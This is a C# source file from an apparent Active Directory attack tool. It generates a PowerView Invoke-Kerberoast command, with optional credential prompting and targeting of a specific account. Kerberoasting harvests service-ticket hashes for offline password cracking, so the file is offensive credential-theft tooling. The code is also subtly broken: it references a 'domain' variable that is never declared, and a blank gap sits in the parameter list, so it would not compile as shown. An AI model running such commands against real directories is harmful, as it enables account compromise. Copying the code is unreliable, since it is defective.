using System.Collections.Generic;

namespace AD_Commander.Generators;

// Builds a PowerView `Invoke-Kerberoast` command. Pure text generation only.
// Note: -Domain is intentionally not emitted from the credential's domain field, which is
// usually the NetBIOS name while Invoke-Kerberoast expects a DNS domain; the domain is already
// carried by the PSCredential. Invoke-Kerberoast enumerates SPN accounts on its own.
public static class KerberoastGenerator
{
    public static string Generate(
        string targetUser,
        string outputFormat,
        bool verbose,

        string username)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0;
        List<string> lines = new List<string>();

        if (useCredential)
        {
            lines.Add("$SecPassword = Read-Host \"Credential password\" -AsSecureString");
            lines.Add($"$Cred = New-Object System.Management.Automation.PSCredential('{Ps(domain)}\\{Ps(username)}', $SecPassword)");
            lines.Add("");
        }

        lines.Add("Import-Module .\\PowerView.ps1");
        lines.Add("");

        string command = $"Invoke-Kerberoast -OutputFormat {outputFormat}";
        if (targetUser.Length > 0)
        {
            command += $" -Identity '{Ps(targetUser)}'";
        }
        if (useCredential)
        {
            command += " -Credential $Cred";
        }
        if (verbose)
        {
            command += " -Verbose";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }

    // Escape single quotes so a value can't break out of a PowerShell single-quoted string.
    private static string Ps(string value) => value.Replace("'", "''");
}
